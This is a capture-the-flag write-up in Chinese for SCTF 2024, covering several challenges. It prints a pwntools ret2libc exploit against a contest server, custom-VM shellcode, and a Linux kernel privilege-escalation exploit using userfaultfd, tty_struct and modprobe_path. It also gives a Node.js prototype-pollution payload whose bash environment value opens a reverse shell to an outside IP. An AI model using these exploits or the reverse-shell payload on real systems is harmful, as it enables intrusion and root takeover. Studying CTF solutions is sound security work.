---
title: UKFC2024 SCTF WP
contest: SCTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [factory-menu, custom-vm-shellcode, go-string-rodata, kernel-uffd-modprobe, prototypeless-spawn, rsa-continued-fraction, snow3g-lfsr]
attack_chain:
- factory (Pwn): "How many factorys do you want to build" 菜单 + 38 项
- 24 触发 sort + pop rdi + puts_got 泄 libc
- libc_base = puts - sym['puts']
- 第二次 24 触发 pop rdi + ret + system + /bin/sh
- 自定义 VM 21 个 opcode 0x23-0x33 (xor/exch/push/low_8/shr/shl/rotate/and/syscall)
- shellcode = b'\x28\x26flag' + xor + syscall 调 open+sendfile
- Go 字符串在 .rodata 用 x00 填充 + 拼接 gadget 地址 poprax
- `/bin/sh/bin/sh/...` 重复拼接 rax / rdi / rsi
- Kernel: userfaultfd + modprobe_path 劫持 tty_struct
- tty_fd=open("/dev/ptmx", O_RDWR)
- fake_ops[12] = WORK_FOR_CPU_FN + commit_creds(0) + init_cred
- work_for_cpu_fn 0xffffffff810bd960 (magic 跳转)
- Web ExP0rtApi: file.replace(/\.\.\//g, '') 替换绕过 → 改 __proto__ prototype 污染
- {user: "__proto__", date: 2, reportmessage: {shell: "/bin/bash", env: {BASH_FUNC_whoami%%: ...}}}
- 通过 require-in-the-middle 拦截 child_process spawn
- prototypelessSpawnOpts = Object.create(null) 防止 prototype 锁
- Crypto: N+1 窗口 RSA gift 解 p,q (连分数展开)
- 雪花 3G LFSR 解密 (32 bit 输出 + 1 bit 输入)
key_payload: tty_struct[12] = WORK_FOR_CPU_FN  # kernel EoP
one_liner: SCTF 2024：factory 菜单 ret2libc + 自定义 VM shellcode + Go .rodata 拼接 + 内核 userfaultfd tty 劫持。
lesson: tty_struct[12] = work_for_cpu_fn + commit_creds(0) 是 Linux 内核 EoP 经典手法。
quality: high
---
# UKFC2024 SCTF WP

## 1. Pwn - factory (菜单 + ret2libc)
```python
from pwn import *
io = remote('1.95.81.93', 57777)
elf = ELF('./factory'); libc = ELF("./libc.so.6")

# 38 项菜单 + 24 触发漏洞
sla(b'How many factorys do you want to build: ', str(38))
for i in range(20): sa(b' = ', b'n')
sa(b' = ', b'24')
# 第一次: 泄 libc
puts_got = elf.got['puts']; main_addr = elf.sym['main']; pop_rdi = 0x401563
sa(b' = ', b'n')
sa(b' = ', str(pop_rdi))
sa(b' = ', str(puts_got))
sa(b' = ', str(elf.plt['puts']))
sa(b' = ', str(main_addr))
for i in range(7): sa(b' = ', b'n')
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']

# 第二次: ret2system
sa(b' = ', b'n'); sa(b' = ', str(pop_rdi))
sa(b' = ', str(libc_base + 0x1b45bd))  # /bin/sh
sa(b' = ', str(0x40101a))  # ret
sa(b' = ', str(libc_base + libc.sym['system']))
sa(b' = ', str(main_addr))
```

## 2. Pwn - 自定义 VM 21 opcode
```c
// 0x23-0x33 操作码
case 0x23: xor s1, s2 -> s2
case 0x24: exch s1, s3
case 0x25: exch s1, s2
case 0x26: push 4byte from code to stack
case 0x27: s1 -> s1 low 8 bit
case 0x28: stack offset--
case 0x29: shr s1 8
case 0x2a: stack offset++ & s1 -> new addr
case 0x2b: shl s1 8
case 0x2c: stack offset-- & s1 -> rax
case 0x2d: ror s1, s2l
case 0x2e: rol s1, s2l
case 0x2f: and s1, s2 -> s2
case 0x30: syscall
case 0x31: s1addr -> s0
case 0x32: continue
case 0x33: exit
```

### Shellcode
```python
shellcode = b'\x28\x26flag'  # 压 "flag" 字符串
shellcode += b'\x2a\x28\x31'  # s1addr -> s0
shellcode += b'\x2a\x2a\x2a\x23\x24\x2a\x2a\x23\x24'  # xor/exch
shellcode += b'\x28\x26\x02\x00\x00\x00'  # 压 0x02
shellcode += b'\x30'  # syscall (open)
# 后续 sendfile/read/write
```

## 3. Pwn - Go .rodata 拼接
```go
// /bin/sh 重复填充 rax / rdi
return "/bin/sh/bin/sh/bin/sh/.../bin/sh"  // 240 字节
```

## 4. Kernel - userfaultfd + modprobe_path
```c
#define COMMIT_CREDS 0xFFFFFFFF81097D00
#define INIT_CRED 0xFFFFFFFF82448CC0
#define WORK_FOR_CPU_FN 0xffffffff810bd960
#define POP_RDI_RET 0xffffffff81008989
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81C00aa5

void get_flag() {
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\xff\xff\xff\xff' > /tmp/sekiro");
    system("chmod +x /tmp/sekiro");
    system("/tmp/sekiro");  // modprobe_path 触发 /tmp/x
}

void hijack_handler() {
    tty_fd = open("/dev/ptmx", O_RDWR);
    uffd_buf[0] = 0x100005401;
    uffd_buf[1] = addrsp_0x1a0 + kernel_offset;
    uffd_buf[2] = heapaddr + (0xffff88800e11a6c0 - 0xffff88800e3d2800);
    uffd_buf[4] = COMMIT_CREDS + kernel_offset;
    uffd_buf[5] = INIT_CRED + kernel_offset;
    uffdio_copy.src = uffd_buf;
    uffdio_copy.dst = msg.arg.pagefault.address;
    ioctl(uffd, UFFDIO_COPY, &uffdio_copy);
}
```

## 5. Web - prototype 污染 + spawn RCE
```javascript
// ExP0rtApi 路由: file.replace(/\.\.\//g, '') 替换 ../
// 漏洞: 替换后为空字符串可绕过白名单
// require-in-the-middle patch child_process
cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) });

// 攻击 payload
{
    "user": "__proto__",
    "date": 2,
    "reportmessage": {
        "shell": "/bin/bash",
        "env": {"BASH_FUNC_whoami%%": "() { bash -c 'bash -i >& /dev/tcp/12.34.56.78/2333 0>&1'; }"}
    }
}
```

## 6. Crypto - RSA 连分数
```python
# Wiener / Boneh-Durfee 类: 已知 e, N, gift (与 p²+p+1)(q²+q+1) 相关
def continued_fraction(numerator, denominator):
    while denominator:
        q, r = divmod(numerator, denominator)
        yield q
        numerator, denominator = denominator, r

def find_valid_gifts(e, N):
    for k, d in convergents(continued_fraction(e, N**2)):
        if k == 0 or (e * d - 1) % k != 0: continue
        yield (e * d - 1) // k

# 求解 p, q
p, q = symbols('p q')
solutions = solve([Eq(N, p*q), Eq((p**2+p+1)*(q**2+q+1), gift)], (p, q))
flag = 'SCTF{' + md5(long_to_bytes(int(p_candidate))).hexdigest() + '}'
```

## 7. Crypto - 雪花 3G LFSR
- 32 bit 输出 + 1 bit 输入 → 32 bit keystream
- 函数 `decrypt(res)`: if (res % 2 == 0) res /= 2; else res ^= 0x85B6874F; res /= 2; res |= (1 << 31)
- 动调取 key[i*4+j], 10 组 4 字节
